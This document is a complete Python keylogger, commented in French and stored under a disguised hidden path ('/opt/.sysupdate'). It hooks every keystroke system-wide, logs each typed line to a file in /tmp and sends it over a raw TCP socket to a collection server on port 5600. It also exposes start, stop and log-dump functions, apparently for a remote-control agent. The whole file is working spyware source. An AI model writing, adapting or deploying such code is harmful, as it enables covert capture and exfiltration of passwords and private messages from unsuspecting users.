#!/usr/bin/python3
# /opt/.sysupdate/keylogger_agent.py

import keyboard
import threading
import time
import socket
import os

# Configuration pour l'envoi vers le serveur de réception
SERVER_IP = "192.168.213.139"   # Remplacez par l'adresse IP de votre serveur de réception
SERVER_PORT = 5600              # Port de réception dédié pour les frappes

# Fichiers locaux pour stockage et débogage
KEYLOG_FILE = "/tmp/keystrokes.log"
DEBUG_FILE = "/tmp/keylogger_debug.log"

def debug_log(msg):
    try:
        with open(DEBUG_FILE, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\n")
    except Exception:
        pass

_buffer_lock = threading.Lock()
_buffer = ""

def flush_buffer():
    """Écrit le contenu du tampon dans le fichier local et l'envoie au serveur, puis vide le tampon."""
    global _buffer
    with _buffer_lock:
        if _buffer:
            phrase = _buffer
            try:
                # Enregistrement local
                with open(KEYLOG_FILE, "a") as f:
                    f.write(phrase + "\n")
                debug_log("Buffer flushed locally: " + phrase)
            except Exception as e:
                debug_log("Error writing to keylog file: " + str(e))
            # Envoi au serveur
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((SERVER_IP, SERVER_PORT))
                s.sendall(phrase.encode('utf-8'))
                s.close()
                debug_log("Sent phrase to server: " + phrase)
            except Exception as e:
                debug_log("Error sending to server: " + str(e))
            _buffer = ""

def on_event(event):
    """
    Callback appelée pour chaque événement clavier.
    Accumule les frappes dans le tampon.
    Dès qu'une touche "enter" est détectée, le tampon est flushé.
    """
    global _buffer
    if event.event_type != "down":
        return
    key = event.name
    if key == "enter":
        key = "\n"
    elif key == "space":
        key = " "
    with _buffer_lock:
        _buffer += key
        if "\n" in _buffer:
            flush_buffer()

def start_keylogger():
    """
    Démarre le keylogger en installant un hook global.
    Force également la création du fichier local de log.
    """
    try:
        # Création initiale du fichier de log
        with open(KEYLOG_FILE, "a") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Keylogger starting...\n")
        debug_log("Keylogger file created")
        keyboard.hook(on_event)
        debug_log("Keyboard hook installed")
        return "[Keylogger] Started."
    except Exception as e:
        debug_log("Keylogger failed to start: " + str(e))
        return "[Keylogger] Failed to start: " + str(e)

def stop_keylogger():
    """
    Arrête le keylogger et vide le tampon.
    """
    try:
        keyboard.unhook_all()
        flush_buffer()
        return "[Keylogger] Stopped."
    except Exception as e:
        return "[Keylogger] Failed to stop: " + str(e)

def get_logs():
    """
    Lit le fichier KEYLOG_FILE et renvoie son contenu.
    Après lecture, vide le fichier pour éviter des doublons.
    """
    flush_buffer()  # S'assurer que le tampon est vidé avant la lecture
    try:
        with open(KEYLOG_FILE, "rb") as f:
            data = f.read()
        with open(KEYLOG_FILE, "w") as f:
            f.truncate(0)
        return data if data else b"[Keylogger] No data.\n"
    except Exception as e:
        return ("[Keylogger] Error reading log: " + str(e)).encode('utf-8')

def main():
    start_msg = start_keylogger()
    debug_log(start_msg)
    # Boucle infinie pour maintenir le service actif
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
